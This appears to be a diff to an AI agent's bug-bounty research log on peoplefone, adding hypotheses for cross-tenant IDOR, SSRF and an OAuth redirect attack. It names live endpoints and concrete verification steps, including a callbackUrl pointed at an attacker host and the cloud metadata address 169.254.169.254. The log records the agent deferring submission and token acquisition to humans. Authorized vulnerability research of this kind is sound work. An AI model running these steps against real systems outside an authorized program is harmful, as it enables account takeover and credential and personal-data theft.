@@ -1564,3 +1564,31 @@ testability: HUMAN_ONLY
 [LEARN] ACCEPTED SSRF @ 5 callback endpoints: no counter-evidence; retained pending token (24th frozen cycle); triage HOLD.
 [LEARN] REJECTED MISCONFIG/OTHER @ repo scan: reposcan 18:10Z returns no public-org scan (TARGET_ORG unconfigured); library-level leads (mail-validator-mx-server, provisioning-rpc) are out-of-scope code, not scoped hosts, no deployment evidence — no in-scope alternative surface.
 [RISK] peoplefone GmbH: 82/100 — Unchanged. Sole report-ready finding (OAuth open-redirect/login-CSRF, triage VALID 7.4/9.1) still not confirmed submitted at bugs.olivermaicher.eu (valid-bugs count 0) after 24 frozen cycles. Silent-ATO branch falsified for known confidential clients; guaranteed impact narrowed to open-redirect+login-CSRF. Configuration IDOR (85) + SSRF (78) remain live behind a bearer token unacquirable agent-side (register 500 re-verified fresh this cycle; both triage HOLDS pending token). Entire backlog gated on (a) human report submission and (b) human token acquisition via register recovery — no agent-side action moves risk. Risk drops only on confirmed submission with a valid-bugs increment.
+## 2026-09-08 22:45:56 UTC [target] (model bigpickle)
+[HYP] Cross-tenant PBX takeover via Configuration API sequential identifier enumeration (8 resource types)
+class: IDOR
+asset: configuration-api.peoplefone.com/customer/voip/v1/{users,groups,ivrs,queues,numbers,smart-routings,callforwarding,manual-routing}/{identifier}
+confidence: 85
+reasoning: 235KB spec; numeric sequential identifiers; boundary statement "user must be part of account bound to bearer token" but enforcement unproven; UserResponse exposes sipUserName+email+physical address; live 401 gate; cross-model convergence; zero counter-evidence across 25 frozen cycles; triage HOLD pending bearer token
+evidence_needed: tenant-A bearer returns tenant-B {identifier} object via ±1 enumeration
+verify_steps: (authorized, read-only) GET /users, /users/{own_id}, /users/{own_id±1}; repeat /numbers/{did}, /callforwarding/{id}; compare tenant markers
+impact: cross-tenant PBX takeover — SIP creds, PII, DID routing, billing fraud; CRITICAL
+testability: AUTH_HELPED
+[HYP] Cloud metadata/IAM theft via 5 webhook/callback endpoints with zero host/scheme validation
+class: SSRF
+asset: api.peoplefone.com/customer/sms/v1 sms/callbackUrl + call-api smart-routings/{id}/webhook + uaCSTA callbackUrl/monitoringCallbackUrl + configuration-api external-number-lookup webhookUrl
+confidence: 78
+reasoning: format:uri no enum/allowlist across 5 endpoints; External Number Lookup forwards Authorization/X-API-Key to attacker URL; deprecated External Routing (2026-09-30) repeats pattern on weaker path; zero counter-evidence across 25 frozen cycles; triage HOLD pending bearer token
+evidence_needed: post-auth callback reaches attacker host; 169.254.169.254/private ranges unfiltered
+verify_steps: (authorized) POST SMS callbackUrl=https://attacker/x and http://169.254.169.254/latest/meta-data/; inspect attacker-side receipt only
+impact: metadata/IAM theft, internal SIP/PBX pivot, call-metadata leak; CRITICAL
+testability: AUTH_HELPED
+[HYP] OAuth arbitrary redirect_uri / open-redirect + login-CSRF on auth (client_id=1)
+class: AUTH
+asset: auth.peoplefone.com/oauth/authorize (+ /oauth/token)
+confidence: 62
+reasoning: authorize 302→/de_CH/login preserves arbitrary redirect_uri for client_id=1 with implicit+PKCE accepted (warm session); stateless authorize 404 but sets redirect_uri cookie (httponly/secure/1yr) with attacker value; token endpoint enforces client-secret (401 invalid_client clients 1/4/5; nonexistent → 500); code-theft-exchange ATO falsified for known confidential clients; guaranteed primitive = open-redirect+login-CSRF; 00:30 triage VALID 7.4 (9.1 conditional), sole report-ready item
+evidence_needed: warm-session authorize response_type=token + attacker redirect_uri yields access_token fragment; else open-redirect+login-CSRF stands
+verify_steps: (authorized, human) warm portal session; authorize?client_id=1&response_type=token&redirect_uri=attacker; observe fragment; else submit as open-redirect+login-CSRF
+impact: silent ATO of portal users (recordings, CDR, PBX, billing, PII) if implicit; else open-redirect+login-CSRF; CRITICAL conditional
+testability: HUMAN_ONLY
